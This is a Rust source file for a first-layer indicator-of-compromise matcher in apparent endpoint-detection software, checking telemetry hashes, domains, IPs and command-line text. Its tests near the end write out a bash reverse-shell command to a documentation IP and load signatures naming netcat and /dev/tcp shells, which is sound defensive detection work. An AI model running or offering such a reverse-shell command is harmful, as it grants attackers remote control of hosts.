use std::collections::HashSet;
use std::io::BufRead;
use std::net::IpAddr;
#[cfg(unix)]
use std::os::fd::AsRawFd;
use std::path::{Path, PathBuf};

use aho_corasick::AhoCorasick;
use rusqlite::{params, Connection};

use crate::types::TelemetryEvent;

pub(crate) const PREFILTER_MAX_LOAD_FACTOR: f64 = 0.95;
const EXACT_STORE_INSERT_CHUNK_SIZE: usize = 50_000;

#[cfg(all(test, not(miri)))]
pub(crate) fn cuckoo_false_positive_rate(bucket_size: u32, fingerprint_bits: u32) -> f64 {
    let numerator = 2.0 * bucket_size as f64;
    let denominator = 2_f64.powi(fingerprint_bits as i32);
    numerator / denominator
}

pub(crate) fn should_rebuild_prefilter(load_factor: f64, insertion_failed: bool) -> bool {
    insertion_failed || load_factor > PREFILTER_MAX_LOAD_FACTOR
}

pub(crate) fn normalize_for_matching(raw: &str) -> String {
    let mut out = String::with_capacity(raw.len());
    for ch in raw.chars() {
        let c = if ch == '\\' { '/' } else { ch };
        out.push(c.to_ascii_lowercase());
    }
    out
}

fn normalize_ip_for_matching(raw: &str) -> String {
    raw.parse::<IpAddr>()
        .map(|ip| ip.to_string())
        .unwrap_or_else(|_| raw.to_ascii_lowercase())
}

fn parse_ioc_line(line: &str) -> Option<&str> {
    let trimmed = line.trim();
    if trimmed.is_empty() || trimmed.starts_with('#') {
        return None;
    }

    let indicator = trimmed.split('#').next().unwrap_or(trimmed).trim();
    if indicator.is_empty() {
        None
    } else {
        Some(indicator)
    }
}

fn domain_suffix_candidates(domain: &str) -> Vec<&str> {
    let mut candidates = vec![domain];
    for (index, ch) in domain.char_indices() {
        if ch == '.' && index + 1 < domain.len() {
            candidates.push(&domain[index + 1..]);
        }
    }
    candidates
}

#[cfg(all(test, not(miri)))]
pub(crate) fn base64ish_alphabet_ratio(raw: &str) -> f64 {
    let mut total = 0usize;
    let mut in_alphabet = 0usize;

    for b in raw.bytes() {
        if b.is_ascii_whitespace() {
            continue;
        }
        total += 1;
        if b.is_ascii_alphanumeric() || matches!(b, b'+' | b'/' | b'=' | b'-' | b'_') {
            in_alphabet += 1;
        }
    }

    if total == 0 {
        0.0
    } else {
        in_alphabet as f64 / total as f64
    }
}

#[cfg(all(test, not(miri)))]
pub(crate) fn passes_optional_alphabet_ratio_gate(raw: &str, min_ratio: Option<f64>) -> bool {
    let Some(min_ratio) = min_ratio else {
        return true;
    };
    base64ish_alphabet_ratio(raw) >= min_ratio
}

fn hashset_load_factor(set: &HashSet<String>) -> f64 {
    if set.is_empty() {
        return 0.0;
    }
    let cap = set.capacity().max(1);
    set.len() as f64 / cap as f64
}

fn rebuild_prefilter_if_needed(set: &mut HashSet<String>, rebuilds: &mut usize) {
    let load_factor = hashset_load_factor(set);
    if !should_rebuild_prefilter(load_factor, false) {
        return;
    }

    let target = ((set.len().max(1) as f64) / PREFILTER_MAX_LOAD_FACTOR).ceil() as usize + 1;
    let mut rebuilt = HashSet::with_capacity(target);
    for value in set.drain() {
        rebuilt.insert(value);
    }
    *set = rebuilt;
    *rebuilds = rebuilds.saturating_add(1);
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Layer1Result {
    Clean,
    PrefilterOnly,
    ExactMatch,
}

#[derive(Debug, Clone)]
pub struct Layer1EventHit {
    pub result: Layer1Result,
    pub prefilter_hit: bool,
    pub matched_fields: Vec<String>,
    pub matched_signatures: Vec<String>,
}

impl Default for Layer1EventHit {
    fn default() -> Self {
        Self {
            result: Layer1Result::Clean,
            prefilter_hit: false,
            matched_fields: Vec::new(),
            matched_signatures: Vec::new(),
        }
    }
}

pub struct IocExactStore {
    conn: Option<Connection>,
    path: Option<PathBuf>,
    delete_on_drop: bool,
}

impl std::fmt::Debug for IocExactStore {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        f.debug_struct("IocExactStore").finish()
    }
}

impl IocExactStore {
    pub fn in_memory() -> rusqlite::Result<Self> {
        let conn = Connection::open_in_memory()?;
        let store = Self {
            conn: Some(conn),
            path: None,
            delete_on_drop: false,
        };
        store.init_schema()?;
        Ok(store)
    }

    pub fn open(path: &str) -> rusqlite::Result<Self> {
        Self::open_internal(Path::new(path), false)
    }

    pub fn open_ephemeral(path: &Path) -> rusqlite::Result<Self> {
        Self::open_internal(path, true)
    }

    fn open_internal(path: &Path, delete_on_drop: bool) -> rusqlite::Result<Self> {
        let conn = Connection::open(path)?;
        let store = Self {
            conn: Some(conn),
            path: Some(path.to_path_buf()),
            delete_on_drop,
        };
        store.init_schema()?;
        Ok(store)
    }

    fn init_schema(&self) -> rusqlite::Result<()> {
        self.conn().execute_batch(
            "
            CREATE TABLE IF NOT EXISTS ioc_hashes(hash TEXT PRIMARY KEY);
            CREATE TABLE IF NOT EXISTS ioc_domains(domain TEXT PRIMARY KEY);
            CREATE TABLE IF NOT EXISTS ioc_ips(ip TEXT PRIMARY KEY);
            ",
        )
    }

    pub fn load_hashes<I>(&mut self, values: I) -> rusqlite::Result<()>
    where
        I: IntoIterator<Item = String>,
    {
        self.load_chunked(
            "INSERT OR IGNORE INTO ioc_hashes(hash) VALUES(?1)",
            values,
            |v| v.to_ascii_lowercase(),
        )
    }

    pub fn load_domains<I>(&mut self, values: I) -> rusqlite::Result<()>
    where
        I: IntoIterator<Item = String>,
    {
        self.load_chunked(
            "INSERT OR IGNORE INTO ioc_domains(domain) VALUES(?1)",
            values,
            |v| v.trim_end_matches('.').to_ascii_lowercase(),
        )
    }

    pub fn load_ips<I>(&mut self, values: I) -> rusqlite::Result<()>
    where
        I: IntoIterator<Item = String>,
    {
        self.load_chunked(
            "INSERT OR IGNORE INTO ioc_ips(ip) VALUES(?1)",
            values,
            |v| normalize_ip_for_matching(&v),
        )
    }

    pub fn contains_hash(&self, hash: &str) -> rusqlite::Result<bool> {
        let mut stmt = self
            .conn()
            .prepare_cached("SELECT 1 FROM ioc_hashes WHERE hash = ?1 LIMIT 1")?;
        let mut rows = stmt.query(params![hash.to_ascii_lowercase()])?;
        Ok(rows.next()?.is_some())
    }

    pub fn contains_domain(&self, domain: &str) -> rusqlite::Result<bool> {
        let mut stmt = self
            .conn()
            .prepare_cached("SELECT 1 FROM ioc_domains WHERE domain = ?1 LIMIT 1")?;
        let mut rows = stmt.query(params![domain.trim_end_matches('.').to_ascii_lowercase()])?;
        Ok(rows.next()?.is_some())
    }

    pub fn contains_ip(&self, ip: &str) -> rusqlite::Result<bool> {
        let mut stmt = self
            .conn()
            .prepare_cached("SELECT 1 FROM ioc_ips WHERE ip = ?1 LIMIT 1")?;
        let mut rows = stmt.query(params![normalize_ip_for_matching(ip)])?;
        Ok(rows.next()?.is_some())
    }

    fn conn(&self) -> &Connection {
        self.conn
            .as_ref()
            .expect("IOC exact-store connection is unavailable")
    }

    fn conn_mut(&mut self) -> &mut Connection {
        self.conn
            .as_mut()
            .expect("IOC exact-store connection is unavailable")
    }

    fn load_chunked<I, F>(&mut self, sql: &str, values: I, mut normalize: F) -> rusqlite::Result<()>
    where
        I: IntoIterator<Item = String>,
        F: FnMut(String) -> String,
    {
        let mut values = values.into_iter().peekable();
        while values.peek().is_some() {
            let tx = self.conn_mut().transaction()?;
            {
                let mut stmt = tx.prepare(sql)?;
                for value in values.by_ref().take(EXACT_STORE_INSERT_CHUNK_SIZE) {
                    stmt.execute(params![normalize(value)])?;
                }
            }
            tx.commit()?;
            self.release_page_cache();
        }
        Ok(())
    }

    fn release_page_cache(&self) {
        #[cfg(unix)]
        {
            let Some(path) = self.path.as_ref() else {
                return;
            };
            let Ok(file) = std::fs::File::open(path) else {
                return;
            };
            #[cfg(not(target_os = "macos"))]
            {
                let _ = unsafe {
                    libc::posix_fadvise(file.as_raw_fd(), 0, 0, libc::POSIX_FADV_DONTNEED)
                };
            }
        }
    }
}

impl Drop for IocExactStore {
    fn drop(&mut self) {
        if let Some(conn) = self.conn.take() {
            let _ = conn.close();
        }

        if !self.delete_on_drop {
            return;
        }

        let Some(path) = self.path.as_ref() else {
            return;
        };
        let _ = std::fs::remove_file(path);
        let _ = std::fs::remove_file(sqlite_sidecar_path(path, "-wal"));
        let _ = std::fs::remove_file(sqlite_sidecar_path(path, "-shm"));
    }
}

fn sqlite_sidecar_path(path: &Path, suffix: &str) -> PathBuf {
    let mut value = path.as_os_str().to_os_string();
    value.push(suffix);
    PathBuf::from(value)
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum IocLookupMode {
    Prefiltered,
    ExactStoreOnly,
}

#[derive(Debug)]
pub struct IocLayer1 {
    prefilter_hashes: HashSet<String>,
    prefilter_domains: HashSet<String>,
    prefilter_ips: HashSet<String>,
    matcher_patterns: Vec<String>,
    matcher: Option<AhoCorasick>,
    exact_store: Option<IocExactStore>,
    lookup_mode: IocLookupMode,
    prefilter_rebuilds: usize,
    exact_store_only_entries: usize,
}

impl IocLayer1 {
    pub fn new() -> Self {
        Self {
            prefilter_hashes: HashSet::new(),
            prefilter_domains: HashSet::new(),
            prefilter_ips: HashSet::new(),
            matcher_patterns: Vec::new(),
            matcher: None,
            exact_store: None,
            lookup_mode: IocLookupMode::Prefiltered,
            prefilter_rebuilds: 0,
            exact_store_only_entries: 0,
        }
    }

    pub fn with_sqlite(path: &str) -> rusqlite::Result<Self> {
        let mut layer = Self::new();
        layer.exact_store = Some(IocExactStore::open(path)?);
        Ok(layer)
    }

    pub fn set_exact_store(&mut self, store: IocExactStore) {
        self.exact_store = Some(store);
    }

    pub fn enable_exact_store_only(&mut self, mut store: IocExactStore) {
        let migrated_entries =
            self.prefilter_hashes.len() + self.prefilter_domains.len() + self.prefilter_ips.len();
        if !self.prefilter_hashes.is_empty() {
            let _ = store.load_hashes(self.prefilter_hashes.iter().cloned());
        }
        if !self.prefilter_domains.is_empty() {
            let _ = store.load_domains(self.prefilter_domains.iter().cloned());
        }
        if !self.prefilter_ips.is_empty() {
            let _ = store.load_ips(self.prefilter_ips.iter().cloned());
        }

        self.prefilter_hashes.clear();
        self.prefilter_domains.clear();
        self.prefilter_ips.clear();
        self.exact_store = Some(store);
        self.lookup_mode = IocLookupMode::ExactStoreOnly;
        self.exact_store_only_entries = migrated_entries;
    }

    pub fn load_hashes<I>(&mut self, values: I)
    where
        I: IntoIterator<Item = String>,
    {
        let _ = self.load_hashes_internal(values);
    }

    pub fn load_domains<I>(&mut self, values: I)
    where
        I: IntoIterator<Item = String>,
    {
        let _ = self.load_domains_internal(values);
    }

    pub fn load_ips<I>(&mut self, values: I)
    where
        I: IntoIterator<Item = String>,
    {
        let _ = self.load_ips_internal(values);
    }

    pub fn load_hashes_from_reader<R>(&mut self, reader: R) -> usize
    where
        R: BufRead,
    {
        self.load_hashes_internal(
            reader
                .lines()
                .filter_map(|line| line.ok())
                .filter_map(|line| parse_ioc_line(&line).map(str::to_string)),
        )
    }

    pub fn load_domains_from_reader<R>(&mut self, reader: R) -> usize
    where
        R: BufRead,
    {
        self.load_domains_internal(
            reader
                .lines()
                .filter_map(|line| line.ok())
                .filter_map(|line| parse_ioc_line(&line).map(str::to_string)),
        )
    }

    pub fn load_ips_from_reader<R>(&mut self, reader: R) -> usize
    where
        R: BufRead,
    {
        self.load_ips_internal(
            reader
                .lines()
                .filter_map(|line| line.ok())
                .filter_map(|line| parse_ioc_line(&line).map(str::to_string)),
        )
    }

    pub fn load_string_signatures<I>(&mut self, patterns: I)
    where
        I: IntoIterator<Item = String>,
    {
        self.matcher_patterns.clear();
        for p in patterns {
            if !p.is_empty() {
                self.matcher_patterns.push(normalize_for_matching(&p));
            }
        }

        self.rebuild_matcher();
    }

    pub fn append_string_signatures<I>(&mut self, patterns: I)
    where
        I: IntoIterator<Item = String>,
    {
        for p in patterns {
            if p.is_empty() {
                continue;
            }
            let normalized = normalize_for_matching(&p);
            if self
                .matcher_patterns
                .iter()
                .any(|existing| existing == &normalized)
            {
                continue;
            }
            self.matcher_patterns.push(normalized);
        }

        self.rebuild_matcher();
    }

    pub fn check_hash(&self, hash: &str) -> Layer1Result {
        let normalized = hash.to_ascii_lowercase();
        if matches!(self.lookup_mode, IocLookupMode::ExactStoreOnly) {
            return match self.exact_store.as_ref() {
                Some(store) if store.contains_hash(&normalized).unwrap_or(false) => {
                    Layer1Result::ExactMatch
                }
                _ => Layer1Result::Clean,
            };
        }
        if !self.prefilter_hashes.contains(&normalized) {
            return Layer1Result::Clean;
        }
        // Prefilter hit — confirm via exact store (SQLite).
        // When no exact_store is configured, prefilter is authoritative.
        if let Some(store) = &self.exact_store {
            if store.contains_hash(&normalized).unwrap_or(false) {
                return Layer1Result::ExactMatch;
            }
            return Layer1Result::PrefilterOnly;
        }
        Layer1Result::ExactMatch
    }

    pub fn check_domain(&self, domain: &str) -> Layer1Result {
        let normalized = domain.trim_end_matches('.').to_ascii_lowercase();
        if normalized.is_empty() {
            return Layer1Result::Clean;
        }
        let candidates = domain_suffix_candidates(&normalized);
        if matches!(self.lookup_mode, IocLookupMode::ExactStoreOnly) {
            return match self.exact_store.as_ref() {
                Some(store)
                    if candidates
                        .iter()
                        .any(|candidate| store.contains_domain(candidate).unwrap_or(false)) =>
                {
                    Layer1Result::ExactMatch
                }
                _ => Layer1Result::Clean,
            };
        }
        if !candidates
            .iter()
            .any(|candidate| self.prefilter_domains.contains(*candidate))
        {
            return Layer1Result::Clean;
        }
        if let Some(store) = &self.exact_store {
            if candidates
                .iter()
                .any(|candidate| store.contains_domain(candidate).unwrap_or(false))
            {
                return Layer1Result::ExactMatch;
            }
            return Layer1Result::PrefilterOnly;
        }
        Layer1Result::ExactMatch
    }

    pub fn check_ip(&self, ip: &str) -> Layer1Result {
        let normalized = normalize_ip_for_matching(ip);
        if matches!(self.lookup_mode, IocLookupMode::ExactStoreOnly) {
            return match self.exact_store.as_ref() {
                Some(store) if store.contains_ip(&normalized).unwrap_or(false) => {
                    Layer1Result::ExactMatch
                }
                _ => Layer1Result::Clean,
            };
        }
        if !self.prefilter_ips.contains(&normalized) {
            return Layer1Result::Clean;
        }
        if let Some(store) = &self.exact_store {
            if store.contains_ip(&normalized).unwrap_or(false) {
                return Layer1Result::ExactMatch;
            }
            return Layer1Result::PrefilterOnly;
        }
        Layer1Result::ExactMatch
    }

    pub fn check_text(&self, text: &str) -> Vec<String> {
        let Some(matcher) = &self.matcher else {
            return Vec::new();
        };

        let normalized = normalize_for_matching(text);
        let mut matches = Vec::new();
        for m in matcher.find_iter(&normalized) {
            if let Some(pattern) = self.matcher_patterns.get(m.pattern().as_usize()) {
                matches.push(pattern.clone());
            }
        }
        matches
    }

    pub fn self_check_hash_sample<I>(&self, sample: I) -> bool
    where
        I: IntoIterator<Item = String>,
    {
        for hash in sample {
            let normalized = hash.to_ascii_lowercase();
            if !self.prefilter_hashes.contains(&normalized) {
                return false;
            }
            if !matches!(self.check_hash(&normalized), Layer1Result::ExactMatch) {
                return false;
            }
        }
        true
    }

    pub fn self_check_domain_sample<I>(&self, sample: I) -> bool
    where
        I: IntoIterator<Item = String>,
    {
        for domain in sample {
            if !matches!(self.check_domain(&domain), Layer1Result::ExactMatch) {
                return false;
            }
        }
        true
    }

    pub fn self_check_ip_sample<I>(&self, sample: I) -> bool
    where
        I: IntoIterator<Item = String>,
    {
        for ip in sample {
            if !matches!(self.check_ip(&ip), Layer1Result::ExactMatch) {
                return false;
            }
        }
        true
    }

    pub fn check_event(&self, event: &TelemetryEvent) -> Layer1EventHit {
        let mut hit = Layer1EventHit::default();

        if let Some(hash) = &event.file_hash {
            Self::apply_result(self.check_hash(hash), "file_hash", &mut hit);
        }
        if let Some(domain) = &event.dst_domain {
            Self::apply_result(self.check_domain(domain), "dst_domain", &mut hit);
        }
        if let Some(ip) = &event.dst_ip {
            Self::apply_result(self.check_ip(ip), "dst_ip", &mut hit);
        }

        // Text signature (Aho-Corasick substring) matches are corroborating
        // signals, not exact IOC matches.  Treat them as prefilter hits so
        // they can escalate confidence when combined with temporal/killchain
        // signals, but don't promote to ExactMatch (→ Definite) on their own.
        if let Some(cmd) = &event.command_line {
            let matches = self.check_text(cmd);
            if !matches.is_empty() {
                hit.prefilter_hit = true;
                hit.matched_fields.push("command_line".to_string());
                hit.matched_signatures.extend(matches);
            }
        }
        if let Some(path) = &event.file_path {
            let matches = self.check_text(path);
            if !matches.is_empty() {
                hit.prefilter_hit = true;
                hit.matched_fields.push("file_path".to_string());
                hit.matched_signatures.extend(matches);
            }
        }

        if hit.result == Layer1Result::Clean && hit.prefilter_hit {
            hit.result = Layer1Result::PrefilterOnly;
        }

        hit
    }

    pub fn ioc_entry_count(&self) -> usize {
        if matches!(self.lookup_mode, IocLookupMode::ExactStoreOnly) {
            return self.exact_store_only_entries;
        }

        self.prefilter_hashes.len() + self.prefilter_domains.len() + self.prefilter_ips.len()
    }

    fn load_hashes_internal<I>(&mut self, values: I) -> usize
    where
        I: IntoIterator<Item = String>,
    {
        if matches!(self.lookup_mode, IocLookupMode::ExactStoreOnly) {
            let mut loaded = 0usize;
            if let Some(store) = self.exact_store.as_mut() {
                let _ = store.load_hashes(values.into_iter().inspect(|_| {
                    loaded = loaded.saturating_add(1);
                }));
            }
            self.exact_store_only_entries = self.exact_store_only_entries.saturating_add(loaded);
            return loaded;
        }

        let mut loaded = 0usize;
        let prefilter = &mut self.prefilter_hashes;
        if let Some(store) = self.exact_store.as_mut() {
            let _ = store.load_hashes(values.into_iter().map(|value| {
                loaded = loaded.saturating_add(1);
                let normalized = value.to_ascii_lowercase();
                prefilter.insert(normalized.clone());
                normalized
            }));
        } else {
            for value in values {
                loaded = loaded.saturating_add(1);
                prefilter.insert(value.to_ascii_lowercase());
            }
        }

        rebuild_prefilter_if_needed(prefilter, &mut self.prefilter_rebuilds);
        loaded
    }

    fn load_domains_internal<I>(&mut self, values: I) -> usize
    where
        I: IntoIterator<Item = String>,
    {
        if matches!(self.lookup_mode, IocLookupMode::ExactStoreOnly) {
            let mut loaded = 0usize;
            if let Some(store) = self.exact_store.as_mut() {
                let _ = store.load_domains(values.into_iter().inspect(|_| {
                    loaded = loaded.saturating_add(1);
                }));
            }
            self.exact_store_only_entries = self.exact_store_only_entries.saturating_add(loaded);
            return loaded;
        }

        let mut loaded = 0usize;
        let prefilter = &mut self.prefilter_domains;
        if let Some(store) = self.exact_store.as_mut() {
            let _ = store.load_domains(values.into_iter().map(|value| {
                loaded = loaded.saturating_add(1);
                let normalized = value.trim_end_matches('.').to_ascii_lowercase();
                prefilter.insert(normalized.clone());
                normalized
            }));
        } else {
            for value in values {
                loaded = loaded.saturating_add(1);
                prefilter.insert(value.trim_end_matches('.').to_ascii_lowercase());
            }
        }

        rebuild_prefilter_if_needed(prefilter, &mut self.prefilter_rebuilds);
        loaded
    }

    fn load_ips_internal<I>(&mut self, values: I) -> usize
    where
        I: IntoIterator<Item = String>,
    {
        if matches!(self.lookup_mode, IocLookupMode::ExactStoreOnly) {
            let mut loaded = 0usize;
            if let Some(store) = self.exact_store.as_mut() {
                let _ = store.load_ips(values.into_iter().inspect(|_| {
                    loaded = loaded.saturating_add(1);
                }));
            }
            self.exact_store_only_entries = self.exact_store_only_entries.saturating_add(loaded);
            return loaded;
        }

        let mut loaded = 0usize;
        let prefilter = &mut self.prefilter_ips;
        if let Some(store) = self.exact_store.as_mut() {
            let _ = store.load_ips(values.into_iter().map(|value| {
                loaded = loaded.saturating_add(1);
                let normalized = normalize_ip_for_matching(&value);
                prefilter.insert(normalized.clone());
                normalized
            }));
        } else {
            for value in values {
                loaded = loaded.saturating_add(1);
                prefilter.insert(normalize_ip_for_matching(&value));
            }
        }

        rebuild_prefilter_if_needed(prefilter, &mut self.prefilter_rebuilds);
        loaded
    }

    fn apply_result(result: Layer1Result, field: &str, hit: &mut Layer1EventHit) {
        match result {
            Layer1Result::Clean => {}
            Layer1Result::PrefilterOnly => {
                hit.prefilter_hit = true;
                hit.matched_fields.push(field.to_string());
                if hit.result != Layer1Result::ExactMatch {
                    hit.result = Layer1Result::PrefilterOnly;
                }
            }
            Layer1Result::ExactMatch => {
                hit.prefilter_hit = true;
                hit.matched_fields.push(field.to_string());
                hit.result = Layer1Result::ExactMatch;
            }
        }
    }

    fn rebuild_matcher(&mut self) {
        if self.matcher_patterns.is_empty() {
            self.matcher = None;
            return;
        }
        self.matcher = AhoCorasick::new(self.matcher_patterns.clone()).ok();
    }

    #[cfg(test)]
    pub(crate) fn debug_matcher_pattern_count(&self) -> usize {
        self.matcher_patterns.len()
    }

    #[cfg(test)]
    pub(crate) fn debug_matcher_pattern_bytes(&self) -> usize {
        self.matcher_patterns.iter().map(|p| p.len()).sum()
    }

    #[cfg(all(test, not(miri)))]
    pub(crate) fn debug_prefilter_load_factors(&self) -> (f64, f64, f64) {
        (
            hashset_load_factor(&self.prefilter_hashes),
            hashset_load_factor(&self.prefilter_domains),
            hashset_load_factor(&self.prefilter_ips),
        )
    }

    #[cfg(all(test, not(miri)))]
    pub(crate) fn debug_prefilter_rebuilds(&self) -> usize {
        self.prefilter_rebuilds
    }
}

impl Default for IocLayer1 {
    fn default() -> Self {
        Self::new()
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn check_text_detects_reverse_shell() {
        let mut l1 = IocLayer1::new();
        l1.load_string_signatures([">& /dev/tcp/".to_string(), "bash -i".to_string()]);
        let hits = l1.check_text("bash -i >& /dev/tcp/198.51.100.77/4444 0>&1");
        eprintln!("hits = {:?}", hits);
        assert!(
            !hits.is_empty(),
            "expected to find 'bash -i' in command line"
        );
        assert!(hits.iter().any(|h| h.contains("bash -i")));
    }

    #[test]
    fn check_event_detects_reverse_shell() {
        let mut l1 = IocLayer1::new();
        l1.load_string_signatures([
            ">& /dev/tcp/".to_string(),
            "bash -i".to_string(),
            "nc -e /bin".to_string(),
        ]);
        let event = crate::types::TelemetryEvent {
            ts_unix: 1000,
            event_class: crate::types::EventClass::ProcessExec,
            pid: 1002,
            ppid: 0,
            uid: 0,
            process: "bash".to_string(),
            parent_process: "unknown".to_string(),
            session_id: 0,
            file_path: Some("/bin/bash".to_string()),
            file_write: false,
            file_hash: None,
            dst_port: None,
            dst_ip: None,
            dst_domain: None,
            command_line: Some("bash -i >& /dev/tcp/198.51.100.77/4444 0>&1".to_string()),
            event_size: None,
            container_runtime: None,
            container_id: None,
            container_escape: false,
            container_privileged: false,
        };
        let hit = l1.check_event(&event);
        eprintln!("hit = {:?}", hit);
        // Text signature matches are corroborating (PrefilterOnly), not ExactMatch
        assert_eq!(hit.result, Layer1Result::PrefilterOnly);
        assert!(hit.prefilter_hit);
        assert!(!hit.matched_signatures.is_empty());
    }
}
